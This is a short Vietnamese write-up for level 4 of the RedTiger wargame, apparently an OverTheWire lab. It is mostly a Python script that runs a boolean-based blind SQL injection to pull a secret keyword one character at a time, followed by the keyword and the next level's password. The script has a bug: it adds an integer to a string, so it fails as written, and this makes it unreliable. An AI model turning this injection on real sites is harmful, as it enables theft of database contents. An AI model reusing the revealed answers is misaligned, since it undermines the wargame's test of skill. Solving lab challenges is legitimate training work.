đọc lỗi này ở:
http://voice0fblackhat.blogspot.com/2012/01/detailed-boolean-based-blind-injection.html

```sh
import urllib2
import re
headers1 = {'Cookie': 'level4login=there_is_no_bug'}
url1="http://redtiger.labs.overthewire.org/level4.php?id=1%20and%20ascii(substring((SELECT%20keyword%20FROM%20level4_secret)"
ketqua=''
for i in range(1,27):
	for j in range(48,122):		
		url=url1+',%d,1))=%d'%(i,j)
		line=urllib2.Request(url=url,headers=headers1)
		line2=urllib2.urlopen(line).read()
		if "1 rows" in line2:
			ketqua=ketqua+j
			print j
			break
print ketqua
```
keyword: killstickswithbr1cks!
The password for the next level is: there_is_a_truck 
